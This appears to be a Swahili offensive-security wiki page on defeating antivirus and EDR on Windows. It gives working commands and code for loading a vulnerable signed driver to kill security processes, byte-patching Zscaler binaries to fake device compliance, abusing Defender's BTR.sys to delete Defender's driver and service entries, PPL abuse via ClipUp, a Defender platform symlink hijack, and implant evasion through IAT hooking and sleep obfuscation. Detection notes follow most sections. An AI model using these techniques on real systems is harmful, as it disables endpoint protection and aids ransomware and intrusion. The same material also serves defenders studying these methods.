## Leta Driver Yako Iliyo Hatarishi (BYOVD) – Kuzima AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia zana ndogo ya console inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kusambaza ransomware. Zana hii huja na **driver yake yenyewe iliyo hatarishi lakini *imesainiwa*** na kuitumia vibaya kutekeleza shughuli za kernel zenye upendeleo ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu ya kuzingatia
1. **Driver iliyosainiwa**: Faili inayowasilishwa kwenye diski ni `ServiceMouse.sys`, lakini binary ni driver iliyosainiwa kihalali ya `AToolsKrnl64.sys` kutoka “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa kuwa driver ina sahihi halali ya Microsoft, hupakiwa hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Usakinishaji wa service**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Mstari wa kwanza husajili driver kama **kernel service**, na wa pili huiwasha ili `\\.\ServiceMouse` ipatikane kutoka user land.
3. **IOCTLs zinazotolewa na driver**
   | Msimbo wa IOCTL | Uwezo                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Kusitisha process yoyote kwa PID (hutumika kuua huduma za Defender/EDR) |
   | `0x990000D0` | Kufuta faili yoyote kwenye diski |
   | `0x990001D0` | Kuondoa driver na kufuta service |

   Mfano mdogo wa C wa proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Kwa nini inafanya kazi**: BYOVD hupita kabisa ulinzi wa user-mode; code inayotekelezwa kwenye kernel inaweza kufungua michakato *iliyolindwa*, kuisimamisha au kuchezea kernel objects bila kujali vipengele vya hardening kama PPL/PP na ELAM.

Ugunduzi / Upunguzaji wa Hatari
• Washa orodha ya Microsoft ya kuzuia vulnerable drivers (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
• Fuatilia uundaji wa kernel services mpya na toa tahadhari driver inapopakiwa kutoka kwenye directory inayoweza kuandikiwa na kila mtu au haipo kwenye allow-list.
• Fuatilia handles za user-mode kwa custom device objects zikifuatiwa na simu za `DeviceIoControl` zinazotiliwa shaka.

### Kupita Ukaguzi wa Zscaler Client Connector wa Hali ya Kifaa kwa Kurekebisha Binaries Zilizo Hifadhiwa Kwenye Diski

**Client Connector** ya Zscaler hutekeleza kanuni za hali ya kifaa ndani ya kifaa husika na hutegemea Windows RPC kuwasilisha matokeo kwa components nyingine. Chaguo mbili dhaifu za usanifu huwezesha kupita ukaguzi kabisa:

1. Tathmini ya hali ya kifaa hufanyika **upande wa client pekee** (thamani ya boolean hutumwa kwa server).
2. RPC endpoints za ndani huthibitisha tu kwamba executable inayounganisha **imesainiwa na Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kurekebisha binaries nne zilizosainiwa kwenye diski**, njia zote mbili zinaweza kuzimwa:

| Binary | Mantiki ya awali iliyorekebishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila wakati, hivyo kila ukaguzi hufaulu |
| `ZSAService.exe` | Simu isiyo ya moja kwa moja kwa `WinVerifyTrust` | Imebadilishwa kuwa NOP ⇒ mchakato wowote (hata usiosainiwa) unaweza kuunganisha kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Imepitwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Ukaguzi wa integrity wa tunnel | Umepitwa |

Dondoo fupi la patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Baada ya kubadilisha faili asili na kuwasha upya service stack:

* **Ukaguzi wote** wa posture huonyesha **green/compliant**.
* Binaries ambazo hazijasainiwa au zimebadilishwa zinaweza kufungua endpoints za named-pipe RPC (kwa mfano, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoathiriwa hupata ufikiaji usio na vizuizi kwa mtandao wa ndani unaofafanuliwa na sera za Zscaler.

Uchunguzi huu unaonyesha jinsi maamuzi ya uaminifu yanayofanywa upande wa client pekee na ukaguzi rahisi wa signatures yanavyoweza kushindwa kwa kubadilisha bytes chache.

## Matumizi mabaya ya utendaji unaoaminika wa Microsoft Defender `BTR.sys`

Driver ya Defender ya **Boot-Time Removal** ni mfano mzuri wa kulinganisha na BYOVD ya kawaida. `BTR.sys` ni component halali ya kurekebisha mfumo, iliyosainiwa na Microsoft, isiyo na hitilafu ya memory corruption wala interface ya IOCTL; baada ya kupata ufikiaji wa administrator na `SeLoadDriverPrivilege`, operator anaweza badala yake kughushi transaction yake binafsi ya kurekebisha mfumo na kupata utendaji unaokusudiwa wa faili na registry wa Ring-0. Hii ni primitive ya **kuzima AV/EDR baada ya mfumo kuathiriwa, si ufikiaji wa awali au kupandisha kiwango cha ruhusa**, na driver inaweza kutolewa kutoka kwenye resource ya `BOOTTIMETOOL` ya `MpEngine.dll` ya target yenyewe badala ya kuleta driver ya mtu mwingine inayoweza kuvutia usikivu.<sup>[[36]](#references)</sup>

### Kuweka driver ya matumizi ya mara moja tayari

Kwa kawaida, Defender huweka resource hiyo kama faili la nasibu la `[a-z]{8}.sys` na kusajili kernel service lenye jina linalofanana. `DriverEntry` husoma thamani ya `Args` ya service, hufungua NTFS ADS iliyorejelewa, husimbua na kuthibitisha orodha ya vitendo, huandika feedback, kisha hurejesha `0xC0000056` (`STATUS_DELETE_PENDING`) baada ya utekelezaji kufanikiwa ili driver ipakuliwe badala ya kubaki ikiwa imepakiwa. Service iliyoghushiwa huwa na thamani bainifu zifuatazo.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Stream ya `:changelist` ina blob moja iliyosimbwa kwa RC4. Builds zilizochanganuliwa hutumia tena ufunguo uleule wa baiti 256, kwa hiyo usimbaji fiche si mpaka wa uidhinishaji. Plaintext halali ina kichwa cha jumla cha baiti 24 (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC ya kichwa na kitambulisho cha muamala kinachotokana na payload), kinachofuatwa na njia ya feedback ya UTF-16 iliyohitimishwa kwa null na idadi yoyote ya vipengee. Kila kipengee kina kichwa cha baiti 16 (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) pamoja na data maalum kwa action inayoishia kwa **baiti nne hasa za NUL**. Kila eneo la kichwa/data hukaguliwa kivyake kwa CRC-32 polynomial `0xEDB88320`, hali ya mwanzo `0xFFFFFFFF`, na **bila XOR ya mwisho** (`~CRC32`); hali ya CRC huwekwa upya kwa kila eneo.<sup>[[36]](#references)[[37]](#references)</sup>

Vitambulisho vya action vinavyokubaliwa hufichua primitives hizi za kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Data ya kipengee | Matokeo |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Futa faili, ikiwemo faili iliyofungwa |
| 2 | `[UTF-16 path]` | Ondoa directory tupu |
| 3 | `[Flags][source][destination]` | Hamisha faili hadi kwenye njia iliyolindwa iliyochaguliwa na mshambuliaji; destination tupu humaanisha kufuta |
| 4 | `[Flags][key path]` | Futa key ya registry kwa kujirudia |
| 5 | `[Flags][key path + "\\" + value]` | Futa value ya registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Unda/sasisha value ya registry na uunde njia za key zinazokosekana |

Kwa actions 5 na 6, kitenganishi cha key/value kwenye waya ni **backslash mbili mfululizo**; njia iliyoandikwa kwa muundo wa kawaida haitatenganishwa ipasavyo. Faili ya feedback kwa kiasi kikubwa huakisi ombi, lakini baiti nne za kwanza za data ya kila kipengee huwa `NTSTATUS` yake ya matokeo. Kwa actions 1 na 2, ambazo hazina sehemu ya awali ya flags, BTR huhamishia njia kwenye baiti nne za mwisho zilizohifadhiwa ili kutoa nafasi ya status hiyo.<sup>[[36]](#references)</sup>

### Mtiririko wa `BTR_CLI` na kipindi cha mwanzo wa boot

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) hutekeleza mnyororo mzima: kutoa `BTR.sys` kutoka Defender ya ndani, kuunda `<random>.sys:changelist` na stream ya feedback, kuserialisha/kukokotoa checksums/kusimba actions zilizounganishwa, kuunda key ya registry ya service moja kwa moja, kisha kuita `NtLoadDriver` kwa `-trigger now` au kuiacha iwe driver ya system-start kwa `-trigger boot`. Kuweka data moja kwa moja kwenye registry huepuka njia ya kawaida ya SCM `CreateServiceW`, kwa hiyo **hakutoi** Service Install Event ID 7045. Artifacts zilizoanzishwa wakati wa boot zinaweza kuondolewa baadaye kwa `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` haiwezi kutumika kwa sababu BTR hufanya I/O ya faili kutoka `DriverEntry` kabla stack ya storage na kiungo cha `SystemRoot` kuwa tayari. `Start=1` pamoja na kundi lenye kipaumbele cha juu la `Boot Bus Extender` badala yake hutekelezwa katika Phase 1: NTFS inaweza kutumika, lakini madereva mengi ya usalama yanayoanza na mfumo na huduma za EDR za user-mode hazijaanzishwa. Vichujio vinavyoanza wakati wa boot kama `WdFilter` huenda tayari vimepakiwa, lakini BTR inaweza kuondoa binaries zake au usanidi wa huduma kabla ya kuwasha tena, na inaweza kufuta executable za huduma kabla SCM haijazizindua. ELAM haizibi mwanya huu kwa sababu BTR huendeshwa baada ya tathmini ya boot-start na ina sahihi halali ya Microsoft.<sup>[[36]](#references)</sup>

Vitendo vingi hutekelezwa katika transaction moja. PoC huongeza Action 1 mwanzoni kwa `\SystemRoot\Temp\BootClean.log` iliyowekwa moja kwa moja: BTR huunda logi hii, kisha hutekeleza ombi lake la kuifuta na kuiondoa kabla ya kujiondoa. Hii hupunguza ushahidi, huku kuweka maoni katika `<random>.sys:<random>.dat` kukiwezesha kuondoa driver na streams zote mbili pamoja.<sup>[[36]](#references)[[37]](#references)</sup>

### Uhusishaji wa ugunduzi wenye ishara dhahiri

Sheria zinazotegemea sahihi pekee na orodha ya Microsoft ya madereva hatari yaliyozuiwa hazishughulikii matumizi mabaya ya utendakazi uliokusudiwa wa BTR. Pendelea uhusishaji huu wa kitabia, huku ukitofautisha nasaba halali ya Defender na launcher isiyohusiana nayo.<sup>[[36]](#references)</sup>

- **Sysmon 15:** uundaji wa `.sys:changelist` hutokea katika kila hatua ya uwekaji wa BTR. ADS ya `.dat` iliyoambatishwa kwenye `.sys` hiyo hiyo inatia shaka hasa kwa sababu Defender halali kwa kawaida huweka maoni chini ya `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bila System 7045:** husisha uundaji wa moja kwa moja wa `HKLM\SYSTEM\CurrentControlSet\Services\<random>` wenye `Args=...:changelist` na `Group=Boot Bus Extender`, bila tukio linalolingana la usakinishaji wa SCM.
- **Sysmon 6 -> 23:** husisha upakiaji wa driver ya BTR inayojulikana, kutoka nasaba isiyotokana na Defender, na ufutaji wa faili unaofuata unaohusishwa na `System`/PID 4, hasa faili za usalama.
- **Sysmon 11 -> 23:** toa tahadhari kuhusu uundaji na ufutaji wa haraka wa `\SystemRoot\Temp\BootClean.log` na `System`/PID 4.
- Zuia na kagua utoaji/uwezeshaji wa `SeLoadDriverPrivilege`; sahihi ya Microsoft pekee haitoshi kuthibitisha uaminifu wakati driver ya zana ya usalama inawekwa na `cmd.exe`, PowerShell, au mchakato usiojulikana.

## Kutumia Vibaya Protected Process Light (PPL) Kuharibu AV/EDR Kwa LOLBINs

Protected Process Light (PPL) hutekeleza ngazi ya signer/level ili michakato iliyolindwa yenye kiwango sawa au cha juu pekee iweze kuingiliana kwa madhara. Kwa upande wa mashambulizi, ukiweza kuzindua kihalali binary iliyowezeshwa kwa PPL na kudhibiti arguments zake, unaweza kubadilisha utendakazi usio na madhara (kwa mfano, logging) kuwa primitive yenye vikwazo, inayoungwa mkono na PPL, ya kuandika kwenye saraka zilizolindwa zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Kinachofanya mchakato uendeshwe kama PPL
- EXE lengwa (na DLL zozote zilizopakiwa) lazima iwe imesainiwa kwa EKU inayoweza kutumia PPL.
- Mchakato lazima uundwe kwa kutumia CreateProcess pamoja na flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Ni lazima iombwe protection level inayooana na inayolingana na signer wa binary (kwa mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa signers za anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa signers za Windows). Viwango visivyo sahihi vitasababisha uundaji kushindwa.

Tazama pia utangulizi mpana zaidi wa PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Zana za launcher
- Msaidizi wa chanzo huria: CreateProcessAsPPL (huchagua protection level na kupitisha arguments kwa EXE lengwa):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Muundo wa matumizi:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` hujizindua yenyewe na hukubali kigezo cha kuandika faili ya logi kwenye njia iliyobainishwa na mwitaji.
- Inapozinduliwa kama mchakato wa PPL, uandishi wa faili hufanyika kwa ulinzi wa PPL.
- ClipUp haiwezi kuchanganua njia zilizo na nafasi; tumia njia fupi za 8.3 kuelekeza kwenye maeneo yanayolindwa kwa kawaida.

Visaidizi vya njia fupi za 8.3
- Orodhesha majina mafupi: `dir /x` katika kila saraka ya mzazi.
- Pata njia fupi katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Mnyororo wa matumizi mabaya (muhtasari)
1) Zindua LOLBIN yenye uwezo wa PPL (ClipUp) kwa kutumia `CREATE_PROTECTED_PROCESS` kupitia launcher (kwa mfano, CreateProcessAsPPL).
2) Pitisha kigezo cha njia ya logi ya ClipUp ili kulazimisha uundaji wa faili kwenye saraka ya AV iliyolindwa (kwa mfano, Defender Platform). Tumia majina mafupi ya 8.3 ikihitajika.
3) Ikiwa AV huwa imefungua/kufunga binary lengwa inapofanya kazi (kwa mfano, MsMpEng.exe), panga uandishi wakati wa kuwasha kompyuta kabla ya AV kuanza kwa kusakinisha huduma ya kujiwasha kiotomatiki ambayo huanza mapema kwa uhakika. Thibitisha mpangilio wa kuwasha kwa Process Monitor (rekodi ya kuwasha).
4) Kompyuta inapowashwa upya, uandishi unaolindwa na PPL hufanyika kabla AV haijafunga binary zake, na kuharibu faili lengwa na kuzuia AV kuanza.

Mfano wa uendeshaji (njia zimefichwa/kufupishwa kwa usalama):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes na vikwazo
- Huwezi kudhibiti maudhui ambayo ClipUp huandika, isipokuwa mahali yanapoandikwa; primitive hii inafaa kwa corruption badala ya kuingiza maudhui mahususi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na muda wa kufanya reboot.
- Muda ni muhimu: target haipaswi kuwa wazi; utekelezaji wakati wa boot huepusha file locks.

Detections
- Uundaji wa process ya `ClipUp.exe` yenye arguments zisizo za kawaida, hasa ikiwa imeanzishwa na launchers zisizo za kawaida, karibu na wakati wa boot.
- Services mpya zilizosanidiwa kuanza kiotomatiki na binaries zinazotiliwa shaka, na zinazoanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya kushindwa kwa Defender kuanza.
- Ufuatiliaji wa uadilifu wa faili kwenye binaries/directories za Defender Platform; uundaji/urekebishaji usiotarajiwa wa faili na processes zenye protected-process flags.
- Telemetry ya ETW/EDR: tafuta processes zilizoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Mitigations
- WDAC/Code Integrity: zuia ni signed binaries zipi zinaweza kuendeshwa kama PPL na chini ya parents zipi; zuia uendeshaji wa ClipUp nje ya miktadha halali.
- Usafi wa service: zuia uundaji/urekebishaji wa services zinazoanza kiotomatiki na fuatilia udanganyifu wa mpangilio wa kuanza.
- Hakikisha ulinzi wa Defender dhidi ya tampering na ulinzi wa early-launch umewashwa; chunguza makosa ya uanzishaji yanayoashiria corruption ya binary.
- Fikiria kuzima utengenezaji wa majina mafupi ya 8.3 kwenye volumes zinazohifadhi security tooling, ikiwa inaendana na mazingira yako (fanya majaribio kwa makini).

## Tampering Microsoft Defender kupitia Platform Version Folder Symlink Hijack

Windows Defender huchagua platform itakayoendeshea kwa kuorodhesha subfolders zilizo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua subfolder yenye mfuatano wa toleo ulio juu zaidi kwa mpangilio wa lexicographic (kwa mfano, `4.18.25070.5-0`), kisha huanzisha processes za Defender service kutoka humo (na kusasisha paths za service/registry ipasavyo). Uteuzi huu huamini directory entries, zikiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye path inayoweza kuandikwa na attacker na kufanikisha DLL sideloading au kuvuruga service.<sup>[[21]](#references)[[22]](#references)</sup>

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks chini ya folder ya Platform)
- Uwezo wa kufanya reboot au kuchochea uteuzi upya wa Defender platform (service restart wakati wa boot)
- Zana zilizojengewa ndani pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia uandishi kwenye folders zake yenyewe, lakini uteuzi wake wa platform huamini directory entries na kuchagua toleo la juu zaidi kwa mpangilio wa lexicographic bila kuthibitisha kuwa lengwa linaelekeza kwenye path iliyolindwa/inayoaminika.

Hatua kwa hatua (mfano)
1) Andaa nakala inayoweza kuandikwa ya folder ya sasa ya platform, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda symlink ya directory yenye toleo la juu ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (kuwasha upya kunapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kuwa MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa upya:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya mchakato chini ya `C:\TMP\AV\` na usanidi wa huduma/registry ukionyesha eneo hilo.

Chaguo za post-exploitation
- DLL sideloading/utekelezaji wa code: Weka au badilisha DLL ambazo Defender hupakia kutoka kwenye saraka yake ya programu ili kutekeleza code katika michakato ya Defender. Tazama sehemu iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Kusimamisha huduma/kuzuia huduma: Ondoa version-symlink ili wakati wa kuanzisha tena, njia iliyosanidiwa isitambuliwe na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Kumbuka kwamba mbinu hii yenyewe haitoi ongezeko la marupurupu; inahitaji haki za msimamizi.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Timu za red team zinaweza kuhamishia ukwepaji wa wakati wa utekelezaji kutoka kwenye C2 implant hadi kwenye moduli lengwa yenyewe kwa kuweka hook kwenye Import Address Table (IAT) yake na kuelekeza API zilizochaguliwa kupitia code inayojitegemea na nafasi (PIC) inayodhibitiwa na mshambuliaji. Hii hueneza ukwepaji zaidi ya API chache ambazo kits nyingi hutoa (kwa mfano, CreateProcessA), na kupanua ulinzi huohuo hadi kwa BOFs na DLL za post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Mbinu ya jumla
- Weka PIC blob pamoja na moduli lengwa kwa kutumia reflective loader (iliyotangulizwa au inayoandamana nayo). PIC lazima ijitosheleze na ijitegemee na nafasi.
- Host DLL inapopakiwa, pitia IMAGE_IMPORT_DESCRIPTOR yake na urekebishe maingizo ya IAT ya imports lengwa (kwa mfano, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) yaelekeze kwenye wrappers nyembamba za PIC.
- Kila wrapper ya PIC hutekeleza ukwepaji kabla ya kuita API halisi mwishoni. Ukwepaji wa kawaida ni pamoja na:
  - Kuficha/kuonyesha kumbukumbu kabla na baada ya mwito (kwa mfano, kusimba maeneo ya beacon, kubadilisha RWX→RX, kubadilisha majina/ruhusa za kurasa), kisha kurejesha hali baada ya mwito.
  - Call-stack spoofing: tengeneza stack isiyo na madhara na uhamie kwenye API lengwa ili uchanganuzi wa call stack uonyeshe fremu zinazotarajiwa.<sup>[[9]](#references)</sup>
- Ili kuendana na mifumo mingine, toa interface ili script ya Aggressor (au sawa nayo) iweze kusajili API za kuweka hook kwa Beacon, BOFs na DLL za post-exploitation.

Kwa nini utumie IAT hooking hapa
- Hufanya kazi kwa code yoyote inayotumia import yenye hook, bila kurekebisha code ya zana au kutegemea Beacon kuelekeza API mahususi.
- Hushughulikia DLL za post-exploitation: kuweka hook kwenye LoadLibrary* hukuwezesha kunasa upakiaji wa moduli (kwa mfano, System.Management.Automation.dll, clr.dll) na kutumia mbinu hizohizo za kuficha na kukwepa uchanganuzi wa stack kwenye miito yao ya API.
- Hurejesha matumizi ya kuaminika ya amri za post-exploitation zinazozindua michakato dhidi ya ugunduzi unaotegemea call stack kwa kufunga CreateProcessA/W ndani ya wrappers.

Mchoro mdogo wa IAT hook (pseudocode ya x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Vidokezo
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr zinaonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Fanya wrappers ziwe ndogo na salama kwa PIC; pata API halisi kupitia thamani ya awali ya IAT uliyonasa kabla ya kuweka patch au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na epuka kuacha kurasa zikiwa writable+executable.

Call-stack spoofing stub
- PIC stubs za mtindo wa Draugr hutengeneza call chain ya bandia (return addresses ndani ya modules zisizo na madhara), kisha huingia kwenye API halisi.
- Hii hushinda detections zinazotarajia canonical stacks kutoka Beacon/BOFs zinapoita APIs nyeti.
- Ziunganishe na mbinu za stack cutting/stack stitching ili kufika ndani ya frames zinazotarajiwa kabla ya API prologue.

Ujumuishaji wa kiutendaji
- Weka reflective loader kabla ya DLLs za post-ex ili PIC na hooks zianzishe kiotomatiki DLL inapopakiwa.
- Tumia script ya Aggressor kusajili APIs lengwa ili Beacon na BOFs zinufaike kwa uwazi na njia ileile ya evasion bila mabadiliko ya code.

Mazingatio ya Detection/DFIR
- Uadilifu wa IAT: entries zinazoelekeza kwenye anwani zisizo za image (heap/anon); uthibitishaji wa mara kwa mara wa import pointers.
- Hitilafu za Stack: return addresses zisizohusiana na images zilizopakiwa; mabadiliko ya ghafla kwenda kwenye PIC isiyo ya image; mfuatano wa asili wa RtlUserThreadStart usiolingana.
- Telemetry ya Loader: maandishi ya ndani ya process kwenye IAT, shughuli za mapema za DllMain zinazobadilisha import thunks, maeneo ya RX yasiyotarajiwa yanayoundwa wakati wa upakiaji.
- Kukwepa upakiaji wa image: ukihook LoadLibrary*, fuatilia upakiaji unaotiliwa shaka wa automation/clr assemblies unaohusiana na matukio ya kuficha memory.

Vipengele vya msingi na mifano inayohusiana
- Reflective loaders zinazofanya IAT patching wakati wa upakiaji (k.m., TitanLdr, AceLdr)
- Memory masking hooks (k.m., simplehook) na stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (k.m., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks kupitia PICO inayobaki

Ikiwa unadhibiti reflective loader, unaweza kuhook imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya `GetProcAddress` ya loader na resolver maalum inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Unda **PICO inayobaki** (persistent PIC object) ambayo hudumu baada ya loader PIC ya muda kujifuta.
- Export kazi ya `setup_hooks()` inayobadilisha import resolver ya loader (k.m., `funcs.GetProcAddress = _GetProcAddress`).
- Katika `_GetProcAddress`, ruka ordinal imports na utumie utafutaji wa hooks unaotegemea hash kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; vinginevyo elekeza ombi kwa `GetProcAddress` halisi.
- Sajili targets za hooks wakati wa ku-link kwa entries za Crystal Palace `addhook "MODULE$Func" "hook"`. Hook hubaki halali kwa kuwa iko ndani ya PICO inayobaki.

Hii huelekeza upya IAT wakati wa import bila kufanya patch kwenye code section ya DLL iliyopakiwa baada ya upakiaji.

### Kulazimisha imports zinazoweza kuhookiwa wakati target inatumia PEB-walking

Import-time hooks hufanya kazi tu ikiwa function ipo kwenye IAT ya target. Ikiwa module inasuluhisha APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili njia ya `ProcessImports()` ya loader iione:

- Badilisha utatuzi wa export unaotegemea hash (k.m., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na rejeleo la moja kwa moja kama `&WaitForSingleObject`.
- Compiler huzalisha entry ya IAT, na hivyo kuwezesha interception reflective loader inaposuluhisha imports.

### Sleep/idle obfuscation ya mtindo wa Ekko bila kufanya patch kwenye `Sleep()`

Badala ya kufanya patch kwenye `Sleep`, hook **wait/IPC primitives halisi** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, funga mwito ndani ya obfuscation chain ya mtindo wa Ekko inayosimba image iliyo kwenye memory wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kupanga mfululizo wa callbacks zinazoita `NtContinue` zikiwa na `CONTEXT` frames zilizotengenezwa maalum.
- Mlolongo wa kawaida (x64): weka image kuwa `PAGE_READWRITE` → simba kwa RC4 kupitia `advapi32!SystemFunction032` kwenye image yote iliyomap → fanya wait inayozuia → futa usimbaji wa RC4 → **rejesha ruhusa za kila section** kwa kupitia PE sections → toa ishara ya kukamilika.
- `RtlCaptureContext` hutoa `CONTEXT` ya kiolezo; nakili kwenye frames kadhaa na weka registers (`Rip/Rcx/Rdx/R8/R9`) ili kuita kila hatua.

Maelezo ya kiutendaji: rudisha “success” kwa waits ndefu (k.m., `WAIT_OBJECT_0`) ili caller iendelee huku image ikiwa imefichwa. Mbinu hii huficha module dhidi ya scanners wakati wa vipindi vya idle na huepuka signature ya kawaida ya “patched `Sleep()`”.

Mawazo ya Detection (yanayotegemea telemetry)
- Mfululizo wa callbacks za `CreateTimerQueueTimer` zinazoelekeza kwenye `NtContinue`.
- `advapi32!SystemFunction032` ikitumika kwenye buffers kubwa mfululizo zenye ukubwa wa image.
- `VirtualProtect` ya eneo kubwa ikifuatiwa na urejeshaji maalum wa ruhusa za kila section.

### Usajili wa CFG wakati wa runtime kwa sleep-obfuscation gadgets

Kwenye targets zilizowezeshwa CFG, indirect jump ya kwanza kwenda kwenye gadget ya katikati ya function kama `jmp [rbx]` au `jmp rdi` kwa kawaida itasababisha process ku-crash kwa `STATUS_STACK_BUFFER_OVERRUN`, kwa sababu gadget hiyo haipo kwenye metadata ya CFG ya module. Ili kuweka chains za mtindo wa Ekko/Kraken zikifanya kazi ndani ya processes zilizoimarishwa:<sup>[[30]](#references)</sup>

